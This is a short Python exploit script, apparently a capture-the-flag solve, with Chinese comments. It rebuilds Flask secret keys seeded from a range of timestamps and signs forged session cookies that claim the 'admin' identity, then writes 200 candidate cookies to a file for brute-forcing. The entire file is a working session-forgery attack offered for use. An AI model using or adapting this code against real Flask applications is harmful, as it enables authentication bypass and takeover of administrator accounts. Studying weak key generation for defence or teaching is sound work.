```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import random
from itsdangerous import URLSafeTimedSerializer as USTS
# 1763178265
START_TS = 1763178250
COUNT = 200
CHARS = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

PAYLOAD = {
    "identity": "admin",
    "username": "admin"
}

OUTPUT_FILE = "./session_fast.txt"


def gen_secret_key(ts):
    random.seed(ts)
    return ''.join(random.choices(CHARS, k=32))


def encode_session(secret_key, payload):
    """直接用 itsdangerous 生成 Flask session cookie"""
    s = USTS(
        secret_key,
        salt="cookie-session",
        serializer=json,
        signer_kwargs={"key_derivation": "hmac", "digest_method": __import__("hashlib").sha1}
    )
    return s.dumps(payload)


def main():
    print(f"[+] 从 timestamp {START_TS} 开始生成 {COUNT} 个 secret_key 并 encode session (极速版本)")

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for i in range(COUNT):
            ts = START_TS + i
            secret_key = gen_secret_key(ts)
            cookie = encode_session(secret_key, PAYLOAD)
            print(cookie)
            f.write(cookie + "\n")

    print(f"[+] 完成！cookie 写入:", OUTPUT_FILE)


if __name__ == "__main__":
    main()
